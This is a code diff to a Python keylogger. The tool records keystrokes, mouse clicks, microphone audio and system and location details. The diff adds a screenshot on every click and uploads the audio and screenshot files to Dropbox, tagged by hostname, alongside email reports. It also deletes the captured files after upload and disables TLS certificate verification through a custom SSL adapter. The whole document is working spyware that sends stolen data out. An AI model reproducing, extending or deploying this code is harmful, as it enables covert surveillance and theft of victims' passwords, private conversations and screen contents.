@@ -1,18 +1,33 @@
+from pynput import keyboard, mouse
+from requests.adapters import HTTPAdapter
+import dropbox
+import geocoder
 import os
 import platform
+import pyscreenshot
 import socket
+import sounddevice as sd
+import ssl
 import time
 import wave
-import pyscreenshot
-import sounddevice as sd
-import geocoder
-from pynput import keyboard, mouse
+
 from utils import (
     send_mail_with_attachment,
     get_wav_and_png_files,
     delete_wav_and_png_files,
     remove_env_file,
+    upload_to_dropbox,
 )
+
+
+class SSLAdapter(HTTPAdapter):
+    # Avoid SSL certificate verification
+    def init_poolmanager(self, *args, **kwargs):
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        kwargs["ssl_context"] = context
+        return super(SSLAdapter, self).init_poolmanager(*args, **kwargs)
 
 
 class KeyLogger:
@@ -27,6 +42,7 @@ class KeyLogger:
         email_receiver,
         cc,
         magic_word,
+        dropbox_token,
     ):
         self.interval = time_interval
         self.smtp_server = smtp_server
@@ -35,6 +51,7 @@ class KeyLogger:
         self.email_password = email_password
         self.email_sender = email_sender
         self.email_receiver = email_receiver
+        self.dropbox_token = dropbox_token
         self.cc = cc
         self.magic_word = magic_word
         self.log = "KeyLogger Started...\n"
@@ -51,14 +68,15 @@ class KeyLogger:
         # self.appendlog(current_move)
         pass  # do nothing
 
-    def on_click(self, x, y, button, pressed):
-        current_click = f"\nMouse click at {x} {y} with button {button}"
-        self.appendlog(current_click)
-
     def on_scroll(self, x, y, dx, dy):
         # current_scroll = f"\nMouse scrolled at {x} {y} with scroll distance {dx} {dy}"
         # self.appendlog(current_scroll)
         pass  # do nothing
+
+    def on_click(self, x, y, button, pressed):
+        current_click = f"\nMouse click at {x} {y} with button {button}"
+        self.screenshot()
+        self.appendlog(current_click)
 
     def save_data(self, key):
         try:
@@ -84,13 +102,23 @@ class KeyLogger:
             email_receiver=self.email_receiver,
             cc=self.cc,
             path_to_attachment=os.getcwd(),
-            attachments=get_wav_and_png_files(),
-            subject="Test keylogged - by F3000",
+            attachments=[],
+            subject="Test KeyLogger - by F3000",
             body=message,
         )
 
     def report(self):
-        self.send_mail(f"\n\n\n{self.log}")
+        self.send_mail(f"{self.log}")
+        wav_and_png_files = get_wav_and_png_files()
+
+        dbx = dropbox.Dropbox(self.dropbox_token)
+        session = dbx._session
+        session.mount("https://", SSLAdapter())
+
+        upload_to_dropbox(socket.gethostname(), dbx, wav_and_png_files)
+
+        delete_wav_and_png_files()
+
         print(self.log)
 
     def cleanup(self):
@@ -100,7 +128,6 @@ class KeyLogger:
         if self.mouse_listener and self.mouse_listener.running:
             self.mouse_listener.stop()
         self.word = ""
-        delete_wav_and_png_files()
 
     def system_information(self):
         hostname = socket.gethostname()
@@ -108,12 +135,13 @@ class KeyLogger:
         processor = platform.processor()
         system = platform.system()
         machine = platform.machine()
-        self.appendlog("\nSystem info:")
+        self.appendlog("System info:")
         self.appendlog(f"\nHostname = {hostname}")
         self.appendlog(f"\nIP = {ip}")
         self.appendlog(f"\nProcessor = {processor}")
         self.appendlog(f"\nSystem OS = {system}")
         self.appendlog(f"\nMachine architecture = {machine}")
+        self.appendlog("\n\n\n")
 
     def get_location(self):
         location = geocoder.ip("me")
@@ -168,7 +196,7 @@ class KeyLogger:
             )
             self.mouse_listener.start()
 
-            self.screenshot()
+            # self.screenshot()
             self.microphone()
 
             time.sleep(self.interval)
